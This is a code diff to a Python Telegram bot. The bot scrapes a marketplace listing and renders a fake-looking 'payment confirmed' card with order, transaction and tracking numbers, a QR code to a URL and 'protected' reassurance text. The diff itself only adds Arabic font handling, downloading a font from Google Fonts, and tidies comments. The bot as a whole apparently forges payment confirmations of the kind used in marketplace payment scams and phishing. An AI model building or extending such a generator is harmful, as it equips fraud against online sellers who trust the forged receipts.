@@ -63,7 +63,25 @@ TRANSLATIONS = {
     }
 }
 
-def font(size, bold=False):
+# --- СКАЧИВАЕМ АРАБСКИЙ ШРИФТ ПРИ СТАРТЕ ---
+ARABIC_FONT_PATH = "arabic_font.ttf"
+def download_arabic_font():
+    if not os.path.exists(ARABIC_FONT_PATH):
+        print("Скачиваем арабский шрифт...")
+        url = "https://github.com/google/fonts/raw/main/ofl/notonaskharabic/NotoNaskhArabic-Regular.ttf"
+        try:
+            r = requests.get(url, timeout=30)
+            with open(ARABIC_FONT_PATH, "wb") as f:
+                f.write(r.content)
+            print("✅ Шрифт скачан!")
+        except Exception as e:
+            print(f"Ошибка скачивания шрифта: {e}")
+
+def font(size, bold=False, is_arabic=False):
+    if is_arabic and os.path.exists(ARABIC_FONT_PATH):
+        try: return ImageFont.truetype(ARABIC_FONT_PATH, size)
+        except: pass
+    
     path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
     try: return ImageFont.truetype(path, size)
     except: return ImageFont.load_default(size=size)
@@ -130,15 +148,19 @@ def get_listing(full_text):
     return {"title": title, "price": price, "currency": currency, "listing_id": listing_id, 
             "image": product_image, "url": response.url, "track_id": track_id, "order_id": order_id, "trans_id": trans_id}
 
+def is_arabic(value):
+    return any("\u0600" <= c <= "\u06FF" for c in str(value))
+
 def prepare_text(value):
     value = str(value)
     value = "".join(c for c in value if not unicodedata.category(c).startswith('So'))
-    if any("\u0600" <= c <= "\u06FF" for c in value): return get_display(arabic_reshaper.reshape(value))
+    if is_arabic(value): 
+        return get_display(arabic_reshaper.reshape(value))
     return value.strip()
 
-def fit_text(draw, value, max_width, size=28):
+def fit_text(draw, value, max_width, size=28, is_arabic_text=False):
     value = prepare_text(value)
-    f = font(size, True)
+    f = font(size, True, is_arabic_text)
     while value and draw.textbbox((0, 0), value, font=f)[2] > max_width: value = value[:-2] + "…"
     return value, f
 
@@ -177,16 +199,21 @@ def make_card(data, lang="EN"):
         cx, cy = x + size//2, y + size//2
         draw.line((cx-15, cy, cx-5, cy+10), fill="white", width=6)
         draw.line((cx-5, cy+10, cx+15, cy-10), fill="white", width=6)
+    
     draw.rounded_rectangle((40, 40, W-40, 160), radius=20, fill=LIGHT_GREEN)
     draw_check_icon(70, 65, 70, GREEN)
-    draw.text((160, 70), prepare_text(t["payment_confirmed"]), font=font(36, True), fill=NAVY)
-    draw.text((160, 115), prepare_text(t["payment_secure"]), font=font(24), fill=GRAY)
+    
+    # Отрисовка текста с проверкой на арабский
+    draw.text((160, 70), prepare_text(t["payment_confirmed"]), font=font(36, True, is_arabic(t["payment_confirmed"])), fill=NAVY)
+    draw.text((160, 115), prepare_text(t["payment_secure"]), font=font(24, False, is_arabic(t["payment_secure"])), fill=GRAY)
+    
     draw.text((W-80, 90), ">", font=font(40, True), fill=GRAY)
     draw.rounded_rectangle((40, 190, W-40, 850), radius=20, fill="white", outline=BORDER, width=2)
-    draw.text((70, 220), prepare_text(t["order"]), font=font(24), fill=GRAY)
+    draw.text((70, 220), prepare_text(t["order"]), font=font(24, False, is_arabic(t["order"])), fill=GRAY)
     draw.text((70, 250), data["order_id"], font=font(55, True), fill=NAVY)
     draw.rounded_rectangle((70, 320, 240, 365), radius=15, fill="#D1F2D8")
-    draw.text((95, 328), prepare_text(t["processing"]), font=font(24, True), fill="#1E7D32")
+    draw.text((95, 328), prepare_text(t["processing"]), font=font(24, True, is_arabic(t["processing"])), fill="#1E7D32")
+    
     if data["image"]:
         img = ImageOps.fit(data["image"], (220, 220), Image.Resampling.LANCZOS)
         mask = Image.new("L", img.size, 0)
@@ -195,62 +222,79 @@ def make_card(data, lang="EN"):
     else:
         draw.rounded_rectangle((70, 400, 290, 620), radius=15, fill="#E9EFF5")
         draw.text((130, 500), t["no_photo"], font=font(20, True), fill=GRAY)
-    title, t_font = fit_text(draw, data["title"], 310, 26)
+        
+    title, t_font = fit_text(draw, data["title"], 310, 26, is_arabic(data["title"]))
     draw.text((320, 410), title, font=t_font, fill=NAVY)
+    
     curr = data['currency'] if data['currency'] else ""
     price_str = f"{data['price']} {curr}" if data["price"] else t["price_not_avail"]
     draw.text((320, 480), price_str, font=font(45, True), fill=NAVY)
+    
     draw.rounded_rectangle((630, 210, 930, 640), radius=20, fill="#F8FAFC", outline=BORDER, width=2)
     qr_img = generate_new_qr(data["url"], size=230) 
     image.paste(qr_img, (665, 240), qr_img) 
-    draw.multiline_text((780, 495), prepare_text(t["qr_text"]), font=font(18), fill=GRAY, align="center", anchor="ma", spacing=4)
+    
+    draw.multiline_text((780, 495), prepare_text(t["qr_text"]), font=font(18, False, is_arabic(t["qr_text"])), fill=GRAY, align="center", anchor="ma", spacing=4)
     draw.line((70, 650, W-70, 650), fill=BORDER, width=2)
+    
     draw.rounded_rectangle((70, 690, 120, 725), radius=5, outline=GRAY, width=4)
     draw.line((70, 700, 120, 700), fill=GRAY, width=4)
-    draw.text((140, 680), prepare_text(t["transaction_id"]), font=font(22), fill=GRAY)
+    draw.text((140, 680), prepare_text(t["transaction_id"]), font=font(22, False, is_arabic(t["transaction_id"])), fill=GRAY)
     draw.text((140, 710), data["trans_id"], font=font(32, True), fill=NAVY)
+    
     truck_x, truck_y = 530, 690
     draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=GRAY, width=4)
     draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=GRAY, width=4)
     draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=GRAY)
     draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=GRAY)
-    draw.text((610, 680), prepare_text(t["tracking_number"]), font=font(22), fill=GRAY)
+    
+    draw.text((610, 680), prepare_text(t["tracking_number"]), font=font(22, False, is_arabic(t["tracking_number"])), fill=GRAY)
     draw.text((610, 710), data["track_id"], font=font(32, True), fill=NAVY)
+    
     draw.rounded_rectangle((40, 880, W-40, 1130), radius=20, fill="white", outline=BORDER, width=2)
     truck_x, truck_y = 70, 910
     draw.rectangle((truck_x, truck_y + 10, truck_x + 40, truck_y + 40), outline=NAVY, width=4)
     draw.polygon([(truck_x+40, truck_y+15), (truck_x+60, truck_y+25), (truck_x+60, truck_y+40), (truck_x+40, truck_y+40)], outline=NAVY, width=4)
     draw.ellipse((truck_x+5, truck_y+35, truck_x+15, truck_y+45), fill=NAVY)
     draw.ellipse((truck_x+45, truck_y+35, truck_x+55, truck_y+45), fill=NAVY)
-    draw.text((150, 910), prepare_text(t["delivery_status"]), font=font(34, True), fill=NAVY)
+    
+    draw.text((150, 910), prepare_text(t["delivery_status"]), font=font(34, True, is_arabic(t["delivery_status"])), fill=NAVY)
+    
     draw.rounded_rectangle((750, 905, 930, 950), radius=15, fill="#D1F2D8")
-    draw.text((780, 915), prepare_text(t["in_progress"]), font=font(22, True), fill="#1E7D32")
+    draw.text((780, 915), prepare_text(t["in_progress"]), font=font(22, True, is_arabic(t["in_progress"])), fill="#1E7D32")
+    
     line_y = 1010
     points = [100, 330, 560, 790]
     draw.line((points[0], line_y, points[-1], line_y), fill=BORDER, width=4)
     draw.line((points[0], line_y, points[1], line_y), fill=GREEN, width=4)
+    
     labels = [t["waiting_seller"], t["seller_confirmed"], t["preparing"], t["courier"]]
     for i, p in enumerate(points):
         if i == 0:
             draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill=GREEN)
             draw.line((p-8, line_y, p-2, line_y+8), fill="white", width=4)
             draw.line((p-2, line_y+8, p+10, line_y-8), fill="white", width=4)
-            draw.text((p-60, line_y+35), prepare_text(labels[i]), font=font(18), fill=NAVY)
+            draw.text((p-60, line_y+35), prepare_text(labels[i]), font=font(18, False, is_arabic(labels[i])), fill=NAVY)
         else:
             draw.ellipse((p-20, line_y-20, p+20, line_y+20), fill="white", outline=BORDER, width=3)
-            draw.text((p-80, line_y+35), prepare_text(labels[i]), font=font(18), fill=GRAY)
+            draw.text((p-80, line_y+35), prepare_text(labels[i]), font=font(18, False, is_arabic(labels[i])), fill=GRAY)
+            
     draw.rounded_rectangle((40, 1160, W-40, 1280), radius=20, fill="white", outline=BORDER, width=2)
     draw_check_icon(70, 1185, 60, GREEN)
-    draw.text((150, 1185), prepare_text(t["protected"]), font=font(30, True), fill=NAVY)
-    draw.text((150, 1225), prepare_text(t["protected_text"]), font=font(20), fill=GRAY)
+    draw.text((150, 1185), prepare_text(t["protected"]), font=font(30, True, is_arabic(t["protected"])), fill=NAVY)
+    draw.text((150, 1225), prepare_text(t["protected_text"]), font=font(20, False, is_arabic(t["protected_text"])), fill=GRAY)
     draw.text((W-80, 1200), ">", font=font(40, True), fill=GRAY)
+    
     draw.rounded_rectangle((40, 1310, W-40, 1390), radius=15, fill="#F0F4F8")
-    draw.text((70, 1335), prepare_text(t["help"]), font=font(22), fill=GRAY)
+    draw.text((70, 1335), prepare_text(t["help"]), font=font(22, False, is_arabic(t["help"])), fill=GRAY)
+    
     output = io.BytesIO()
     image.save(output, format="PNG")
     output.seek(0)
     output.name = "card.png"
     return output
+
+# ... (Остальной код бота: get_blocked_list, block_command, start, handle_link, get_price, get_name, handle_photo, create_command, run_bot - БЕЗ ИЗМЕНЕНИЙ) ...
 
 def get_blocked_list():
     try:
@@ -271,7 +315,6 @@ def unblock_user(user_id):
         return True
     return False
 
-# --- АДМИН КОМАНДЫ ---
 async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
@@ -361,7 +404,6 @@ async def get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if text != "/skip": context.user_data["card_data"]["title"] = text
     data = context.user_data["card_data"]
     
-    # Сохраняем данные в память пользователя для команды /create
     context.user_data["last_card_data"] = data
     
     if data["image"]:
@@ -388,7 +430,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         photo_bytes = await photo_file.download_as_bytearray()
         data["image"] = Image.open(io.BytesIO(photo_bytes)).convert("RGB")
         
-        # Сохраняем данные в память
         context.user_data["last_card_data"] = data
         
         card = await asyncio.to_thread(make_card, data, "EN")
@@ -401,7 +442,6 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"ОШИБКА:\n{e}")
 
-# --- НОВАЯ КОМАНДА /create ---
 async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id in get_blocked_list(): return
     
@@ -424,6 +464,8 @@ async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ ОШИБКА ПРИ СОЗДАНИИ КАРТОЧКИ:\n\n{e}")
 
 async def run_bot():
+    download_arabic_font() # Скачиваем шрифт при запуске
+    
     bot_app = Application.builder().token(TOKEN).build()
     conv_handler = ConversationHandler(
         entry_points=[MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link)],
@@ -437,7 +479,7 @@ async def run_bot():
     bot_app.add_handler(CommandHandler("unblock", unblock_command))
     bot_app.add_handler(CommandHandler("users", users_command))
     bot_app.add_handler(CommandHandler("links", links_command))
-    bot_app.add_handler(CommandHandler("create", create_command)) # Добавили команду /create
+    bot_app.add_handler(CommandHandler("create", create_command))
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(conv_handler)
     bot_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
